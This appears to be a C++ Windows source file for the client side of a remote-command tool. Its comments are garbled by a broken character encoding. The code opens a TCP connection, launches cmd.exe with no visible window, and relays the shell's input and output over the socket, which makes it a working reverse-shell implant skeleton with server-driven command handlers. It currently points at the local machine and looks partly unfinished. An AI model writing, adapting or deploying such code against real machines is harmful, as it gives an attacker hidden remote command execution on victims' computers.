// Client.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#include <Winsock2.h>
#include "../../comment/macro.h"
#pragma comment(lib, "ws2_32.lib")
#include <thread>
void Init();
void Cmd();
HANDLE hMyCmdRead;
HANDLE hMyCmdWrite;

HANDLE hCmdRead;
HANDLE hCmdWrite;
SOCKET Clientsocket;
int _tmain(int argc, _TCHAR* argv[])
{
    Init();
    Cmd();
   

	return 0;
}
void Init()
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return;
    }

    Clientsocket = socket(
        AF_INET,
        SOCK_STREAM,
        0);
    if (Clientsocket == INVALID_SOCKET)
    {
        return ;
    }
    sockaddr_in name;
    name.sin_family = AF_INET;
    name.sin_port = htons(10086);
    name.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
    int nLength = sizeof(name);

    int nRet = connect(Clientsocket, (struct sockaddr*)&name, nLength);

}
//��cmd ����Ϣ
void SentData(HANDLE hMyCmdWrite)
{
    char szbuf[256] = { 0 };

    while (true)
    {
        memset(szbuf, 0, 256);
        int nRet=recv(Clientsocket, szbuf, 256, 0);
        printf("%s", szbuf);
        if (nRet == 0)
        {
            //tcp���ӹر��ˣ����ŶϿ�
            return;
        }
        else if (nRet == SOCKET_ERROR)
        {
            //��ʾ������
            return;
        }
        else
        {
     
            DWORD dwWritedBytes = 0;
            WriteFile(hMyCmdWrite,
                szbuf,
                nRet,
                &dwWritedBytes,
                NULL);
        
        }



    }
}
void Cmd()
{
    //MyCmd  <---< Cmd
    //MyCmd  >---> Cmd
  

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    //Create Pipe
    CreatePipe(&hMyCmdRead, &hCmdWrite, &sa, 0);
    CreatePipe(&hCmdRead, &hMyCmdWrite, &sa, 0);
    //Open cmd
    STARTUPINFOA si = {0};
    si.dwFlags = STARTF_USESTDHANDLES;
    si.cb = sizeof(STARTUPINFO);
    si.hStdOutput = hCmdWrite;
    si.hStdInput = hCmdRead;
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

   


    std::thread t(SentData, hMyCmdWrite);
    char szBuf[256] = { 0 };
    while (1)
    {
        memset(szBuf, 0, 256);
        DWORD dwBytesRead = 0;
       int nRet= ReadFile(hMyCmdRead, szBuf, 256, &dwBytesRead, NULL);
       if (nRet != 0 && dwBytesRead>0)
       {
           printf("%s", szBuf);
           send(Clientsocket, szBuf, dwBytesRead, 0);
           
       }
      
       
    }
    //�ȴ����߳̽���
    t.join();
}

bool CmdThread()
{
    //MyCmd  <---< Cmd
    //MyCmd  >---> Cmd
    HANDLE hMyCmdRead;
    HANDLE hMyCmdWrite;

    HANDLE hCmdRead;
    HANDLE hCmdWrite;

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    //Create Pipe
    CreatePipe(&hMyCmdRead, &hCmdWrite, &sa, 0);
    CreatePipe(&hCmdRead, &hMyCmdWrite, &sa, 0);
    //Open cmd
    STARTUPINFOA si = { 0 };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.cb = sizeof(STARTUPINFO);
    si.hStdOutput = hCmdWrite;
    si.hStdInput = hCmdRead;
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

}
void OnServerCmd(SOCKET s, char* pData, int nLength){
    //����һ������cmdͨ�ŵ��߳�
    std::thread* pThd = new std::thread(CmdThread);

    //֪ͨ�����cmd��������ˡ�
}

void OnServerCmdData(SOCKET s, char* pData, int nLength) {

    DWORD dwWriteBytes = 0;
    WriteFile(hMyCmdWrite, pData, nLength, &dwWriteBytes, NULL);

}

void Handldata()
{

    tagPacket pkt = { 0 };
    char* pData = NULL;
    while (true)
    {
        bool bRet = RecvData(Clientsocket, (char*)&pkt, sizeof(pkt));
        if (pkt.length > 0)
        {
            pData = new char[pkt.length];
            RecvData(Clientsocket, pData, pkt.length);
            switch (pkt.code)
            {

            case SERVER_CMD:
            {
                //��ʾ�Ƿ��������͹�����cmd����
                OnServerCmd(Clientsocket, pData, pkt.length);
            }
            break;

            case SERVER_CMD_DATA:
            {
                //��ʾ�Ƿ��������͹�����cmd����
                OnServerCmdData(Clientsocket, pData, pkt.length);
            }
            break;
            default:
                break;
            }
        }
        if (pData != NULL) {
            delete[] pData;
            pData = NULL;
        }
    }
   
    

}